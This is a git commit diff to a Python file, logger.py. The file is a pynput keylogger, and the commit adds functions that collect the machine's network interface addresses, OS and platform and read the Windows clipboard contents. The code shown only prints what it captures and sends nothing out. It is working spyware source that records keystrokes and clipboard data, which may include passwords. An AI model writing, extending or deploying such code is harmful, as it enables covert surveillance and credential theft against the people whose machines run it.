f5ec232f39f99fc2d60d254369b239555d5e28a1
edf1247 <edf1247@gmail.com>
2024-10-06 14:19:54 -0400

    Added system info grabber and clipboard grabber

--- logger.py
+++ logger.py
@@ -1,6 +1,28 @@
 from pynput import keyboard
+import psutil
+import os
+import platform
+import win32clipboard
 
 keys = []
+
+def get_sys_info():
+    ips = psutil.net_if_addrs()
+    _os = os.name
+    _platform = platform.system()
+    return ips, _os, _platform
+
+print(get_sys_info())
+
+def get_clipboard():
+    win32clipboard.OpenClipboard()
+    data = win32clipboard.GetClipboardData()
+    win32clipboard.CloseClipboard()
+    return data
+
+clipboard = get_clipboard()
+
+print(f"User clipboard: {clipboard}")
 
 def key_press(key):
     try:
@@ -17,5 +39,7 @@ with keyboard.Listener(
         on_press=key_press,
         on_release=release) as listener:
     listener.join()
-
 listener.start()
+
+
+
